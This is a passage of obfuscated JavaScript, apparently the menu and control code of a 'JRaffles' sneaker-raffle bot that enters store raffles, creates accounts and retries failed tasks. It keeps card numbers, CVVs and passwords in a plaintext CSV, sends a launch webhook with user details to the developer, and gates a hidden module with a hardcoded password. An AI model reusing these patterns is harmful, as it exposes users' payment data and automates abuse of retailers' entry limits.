                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x3d45b6) {
                    var _0x22da0f = await _0x405b3f(), _0x28c1c0 = _0xaf9669['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xbefb30 = _0x6aec87['parse'](_0x28c1c0, { 'header': !![] })['data'];
                    for (var _0x4948c8 = 0x0; _0x4948c8 < _0xbefb30['length']; _0x4948c8++) {
                        var _0x5c6b10 = _0xbefb30[_0x4948c8]['Store'], _0x4f3c0e = _0xbefb30[_0x4948c8]['Mode'];
                        for (var _0x54e986 of _0x461a68) {
                            const _0x2c9813 = _0x54e986['name']['includes'](_0x5c6b10);
                            if (!_0x2c9813)
                                continue;
                            for (mode of _0x54e986['modules']) {
                                if (mode['name'] == _0x4f3c0e) {
                                    console['log']('Running\x20' + _0x5dc29b['cyan'](mode['name'])), await mode['function'](mode, [_0xbefb30[_0x4948c8]], _0x22da0f);
                                    var _0x2ceffb = _0x28c1c0['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0xaf9669['writeFileSync']('../failed-tasks.csv', _0x2ceffb);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x221e39 = await _0x160288['get']('Answer');
                    if (_0x221e39['Answer']['toLowerCase']() == 'y') {
                        _0xaf9669['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x415e3e(0x3e8);
                        return;
                    }
                    if (_0x221e39['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x415e3e(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x415e3e(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x38cabd(_0x1b52b1) {
    var _0x367f8b = await _0x405b3f(), _0x4e8add = _0xaf9669['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4935e9 = _0x6aec87['parse'](_0x4e8add, { 'header': !![] })['data'];
    for (var _0x21b8c4 = 0x0; _0x21b8c4 < _0x4935e9['length']; _0x21b8c4++) {
        var _0x170c15 = _0x4935e9[_0x21b8c4]['Store'], _0xb8d712 = _0x4935e9[_0x21b8c4]['Mode'];
        for (var _0x27fed4 of _0x461a68) {
            const _0x497a4a = _0x27fed4['name']['includes'](_0x170c15);
            if (_0x497a4a)
                for (mode of _0x461a68[_0x27fed4]['modules']) {
                    const _0x1ef0de = mode['name']['includes'](_0xb8d712);
                    _0x1ef0de && (_0x1b52b1 = mode['name'], await mode['function'](_0x1b52b1, _0x4935e9[_0x21b8c4], _0x367f8b));
                }
        }
    }
}
async function _0xadf029() {
    await _0x23a9cd(), console['clear']();
    _0x165c4b['threads'] > 0x5 && (_0x165c4b['threads'] = 0x5);
    if (_0x57c4cf != 'devkey' && _0x57c4cf != 'devhook') {
        let _0x116762 = await _0xe99a43['autoUpdate']();
        if (_0x116762 === 'yes')
            return _0x150d9a('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2c6615 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x415e3e(0x2710);
        ;
    }
    await _0x317202(_0x2c6615);
    if (_0x45539d === ![])
        return console['log']('Closing\x20Browser'), await _0x415e3e(0xbb8);
    else
        try {
            var _0x2da94e = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5f9620
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x57c4cf
                    }
                ]
            }];
            const _0x2a30ab = { 'embeds': _0x2da94e };
            var _0x3176fb = await _0x105954(null, null, 'open', ![]);
            const _0x33c99e = { 'openDEVMSG': { 'embeds': [_0x3176fb] } };
            await _0x4d8e61(_0x500f59, _0x33c99e['openDEVMSG']);
            async function _0x4f4e97() {
                _0x424e52('JRaffles\x20' + _0x57c4cf), console['clear'](), console['log']('Hello\x20' + _0x5dc29b['cyan']('' + _0x5f9620) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x57c4cf), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x3b5ac2 = 0x0; _0x3b5ac2 < _0x461a68['length'] - 0x4; _0x3b5ac2++) {
                    if (_0x3b5ac2 >= 0xa) {
                        console['log']('\x20(' + _0x3b5ac2 + ')\x20[' + _0x461a68[_0x3b5ac2]['name'] + ']');
                        continue;
                    }
                    if (_0x461a68[_0x3b5ac2]['name'] === 'Reload\x20Settings' || _0x461a68[_0x3b5ac2]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x3b5ac2 + ')\x20\x20[' + _0x461a68[_0x3b5ac2]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x461a68['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x461a68['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x461a68['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x461a68['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x1ed6f5();
                if (taskModule > _0x461a68['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x415e3e(0x3e8), _0x4f4e97();
                if (_0x461a68[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x5c96b6 = await _0x405b3f();
                            await _0x5f0e51['function'](_0x5f0e51, _0x5c96b6);
                        }
                        if (taskFunction == 0x2) {
                            var _0x5c96b6 = await _0x405b3f(), _0x5543c8 = await _0x5bcf7e(_0x5f0e51);
                            _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x5543c8), await _0x5f0e51['function'](_0x5f0e51, _0x5543c8, _0x5c96b6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5c96b6 = await _0x405b3f(), _0x5543c8 = await _0x5bcf7e(_0x5f0e51);
                                _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x5543c8), await _0x5f0e51['function'](_0x5f0e51, _0x5543c8, _0x5c96b6);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x5c96b6 = await _0x405b3f();
                                    await _0x5f0e51['function'](_0x5f0e51, _0x5c96b6);
                                }
                            }
                        }
                    } catch (_0x1372e3) {
                        console['log'](_0x1372e3), await _0x415e3e(0x7d0);
                    }
                    return _0x4f4e97();
                }
                if (_0x461a68[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                        var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5c96b6 = await _0x405b3f(), _0x491dbf = await _0x5bcf7e(_0x5f0e51);
                            _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x491dbf), await _0x5f0e51['function'](_0x5f0e51, _0x491dbf, _0x5c96b6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5c96b6 = await _0x405b3f(), _0x491dbf = await _0x5bcf7e(_0x5f0e51);
                                _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x491dbf), await _0x5f0e51['function'](_0x5f0e51, _0x491dbf, _0x5c96b6);
                            }
                        }
                    } catch (_0x191e9b) {
                        console['log'](_0x191e9b), await _0x415e3e(0xfa0);
                    }
                    return _0x4f4e97();
                }
                if (_0x461a68[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                        var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5c96b6 = await _0x405b3f(), _0x491dbf = await _0x5bcf7e(_0x5f0e51);
                            _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x491dbf), await _0x5f0e51['function'](_0x5f0e51, _0x491dbf, _0x5c96b6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5c96b6 = await _0x405b3f(), _0x491dbf = await _0x5bcf7e(_0x5f0e51);
                                _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x491dbf), await _0x5f0e51['function'](_0x5f0e51, _0x491dbf, _0x5c96b6);
                            }
                        }
                    } catch (_0x3b7a67) {
                        console['log'](_0x3b7a67), await _0x415e3e(0xfa0);
                    }
                    return _0x4f4e97();
                }
                if (_0x461a68[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x5c96b6 = await _0x405b3f();
                        return await _0x5f0e51['function'](_0x5f0e51, _0x5c96b6), _0x4f4e97();
                    }
                    var _0x5c96b6 = await _0x405b3f(), _0x45cd46 = await _0x5bcf7e(_0x5f0e51);
                    return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x45cd46), await _0x5f0e51['function'](_0x5f0e51, _0x45cd46, _0x5c96b6), _0x4f4e97();
                }
                if (_0x461a68[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5c96b6 = await _0x405b3f(), _0x45cd46 = await _0x5bcf7e(_0x5f0e51);
                    return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x45cd46), await _0x5f0e51['function'](_0x5f0e51, _0x45cd46, _0x5c96b6), _0x4f4e97();
                }
                if (_0x461a68[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5c96b6 = await _0x405b3f(), _0x45cd46 = await _0x5bcf7e(_0x5f0e51);
                    return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x45cd46), await _0x5f0e51['function'](_0x5f0e51, _0x45cd46, _0x5c96b6), _0x4f4e97();
                }
                if (_0x461a68[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction], _0x5c96b6 = await _0x405b3f(), _0x215ba9 = await _0x5bcf7e(_0x5f0e51);
                    return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x215ba9), await _0x5f0e51['function'](_0x5f0e51, _0x215ba9, _0x5c96b6), await _0x415e3e(0x1388), _0x4f4e97();
                }
                if (_0x461a68[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5c96b6 = await _0x405b3f(), _0x45cd46 = await _0x5bcf7e(_0x5f0e51);
                    return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x45cd46), await _0x5f0e51['function'](_0x5f0e51, _0x45cd46, _0x5c96b6), _0x4f4e97();
                } else {
                    if (_0x461a68[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                        var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x5c96b6 = await _0x405b3f(), _0x580d89 = await _0x5bcf7e(_0x5f0e51);
                            return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x580d89), await _0x5f0e51['function'](_0x5f0e51, _0x580d89, _0x5c96b6), _0x4f4e97();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5c96b6 = await _0x405b3f();
                                return await _0x5f0e51['function'](_0x5f0e51, null, _0x5c96b6), _0x4f4e97();
                            }
                        }
                        ;
                    } else {
                        if (_0x461a68[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                            var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction], _0x5c96b6 = await _0x405b3f(), _0x215ba9 = await _0x5bcf7e(_0x5f0e51);
                            return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x215ba9), await _0x5f0e51['function'](_0x5f0e51, _0x215ba9, _0x5c96b6), await _0x415e3e(0x1388), _0x4f4e97();
                        } else {
                            if (_0x461a68[taskModule]['name'] == 'Google\x20Forms') {
                                taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction], _0x5c96b6 = await _0x405b3f(), _0x215ba9 = await _0x5bcf7e(_0x5f0e51);
                                return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x215ba9), await _0x5f0e51['function'](_0x5f0e51, _0x215ba9, _0x5c96b6), await _0x415e3e(0x1388), _0x4f4e97();
                            } else {
                                if (_0x461a68[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x5c96b6 = await _0x405b3f(), _0x580d89 = await _0x5bcf7e(_0x5f0e51);
                                        return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x580d89), await _0x5f0e51['function'](_0x5f0e51, _0x580d89, _0x5c96b6), _0x4f4e97();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x5c96b6 = await _0x405b3f();
                                            return await _0x5f0e51['function'](_0x5f0e51, null, _0x5c96b6), _0x4f4e97();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x461a68[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                        var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x5f0e51);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x461a68[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                            var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5c96b6 = await _0x405b3f(), _0xfd1f1 = await _0x5bcf7e(_0x5f0e51);
                                                return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0xfd1f1), await _0x5f0e51['function'](_0x5f0e51, _0xfd1f1, _0x5c96b6), _0x4f4e97();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5c96b6 = await _0x405b3f(), _0xfd1f1 = await _0x5bcf7e(_0x5f0e51);
                                                    return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0xfd1f1), await _0x5f0e51['function'](_0x5f0e51, _0xfd1f1, _0x5c96b6), _0x4f4e97();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x461a68[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                                var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5c96b6 = await _0x405b3f(), _0xa5aedf = await _0x5bcf7e(_0x5f0e51);
                                                    return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0xa5aedf), await _0x5f0e51['function'](_0x5f0e51, _0xa5aedf, _0x5c96b6), _0x4f4e97();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5c96b6 = await _0x405b3f(), _0xa5aedf = await _0x5bcf7e(_0x5f0e51);
                                                        return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0xa5aedf), await _0x5f0e51['function'](_0x5f0e51, _0xa5aedf, _0x5c96b6), _0x4f4e97();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x461a68[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                                    var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5c96b6 = await _0x405b3f(), _0x107966 = await _0x5bcf7e(_0x5f0e51);
                                                        return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x107966), await _0x5f0e51['function'](_0x5f0e51, _0x107966, _0x5c96b6), _0x4f4e97();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x5c96b6 = await _0x405b3f(), _0x107966 = await _0x5bcf7e(_0x5f0e51);
                                                            return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x107966), await _0x5f0e51['function'](_0x5f0e51, _0x107966, _0x5c96b6), _0x4f4e97();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x461a68[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                                        var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x5c96b6 = await _0x405b3f(), _0x107966 = await _0x5bcf7e(_0x5f0e51);
                                                            return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x107966), await _0x5f0e51['function'](_0x5f0e51, _0x107966, _0x5c96b6), _0x4f4e97();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x5c96b6 = await _0x405b3f(), _0x107966 = await _0x5bcf7e(_0x5f0e51);
                                                                return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x107966), await _0x5f0e51['function'](_0x5f0e51, _0x107966, _0x5c96b6), _0x4f4e97();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x461a68[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                                            var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x5c96b6 = await _0x405b3f(), _0x5e74d3 = await _0x5bcf7e(_0x5f0e51);
                                                                return _0x165c4b['shuffleTasks'] && await _0xf2c680(_0x5e74d3), await _0x5f0e51['function'](_0x5e74d3, _0x5c96b6), _0x4f4e97();
                                                            }
                                                        } else {
                                                            if (_0x461a68[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x415e3e(0x3e8), _0x4f4e97();
                                                            else {
                                                                if (_0x461a68[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x37652c = _0x461a68[taskModule]['name'], _0x5c96b6 = await _0x405b3f();
                                                                    return await _0x1daa70(_0x37652c, _0x5c96b6), _0x4f4e97();
                                                                } else {
                                                                    if (_0x461a68[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x179441(_0x461a68[taskModule]['modules']);
                                                                        var _0x5f0e51 = _0x461a68[taskModule]['modules'][taskFunction];
                                                                        return await _0x5f0e51['function'](_0x5f0e51), _0x4f4e97();
                                                                    } else {
                                                                        if (_0x461a68[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x536334 = 0x0;
                                                                            for (const _0x2df38f in _0x165c4b) {
                                                                                console['log']('(' + _0x536334 + ')\x20' + _0x2df38f + '\x20:\x20' + _0x165c4b[_0x2df38f]), _0x536334++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x536334 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x5f1b47 = await _0x1b6014();
                                                                            if (_0x5f1b47 == _0x536334)
                                                                                return _0x4f4e97();
                                                                            console['clear'];
                                                                            var _0x3281f5 = 0x0;
                                                                            for (var _0x14dd0f in _0x165c4b) {
                                                                                if (_0x5f1b47 == _0x3281f5) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x14dd0f + '\x20:'), _0x165c4b[_0x14dd0f] = await _0xc980f7(), _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b));
                                                                                    break;
                                                                                } else
                                                                                    _0x3281f5++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x415e3e(0xbb8), _0x4f4e97();
                                                                        } else {
                                                                            if (_0x461a68[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x23a9cd(), _0x4f4e97();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x461a68[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x5cfcc5 = await _0x5564b0();
                                                                                    _0x5cfcc5 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x5576da(), await afewFunction(_0x5d7e9b[_0x206356], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x415e3e(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x4f4e97();
            } catch (_0x24249c) {
                return console['log'](_0x24249c), await _0x415e3e(0x2710), _0x4f4e97();
            }
        } catch (_0x58bfc8) {
            return console['log'](_0x58bfc8), await _0x415e3e(0x3a98);
        }
}
;
_0x424e52('JRaffles\x20' + _0x57c4cf);
try {
    _0x23a9cd(), _0xadf029();
} catch (_0x54b517) {
    console['log'](_0x54b517);
}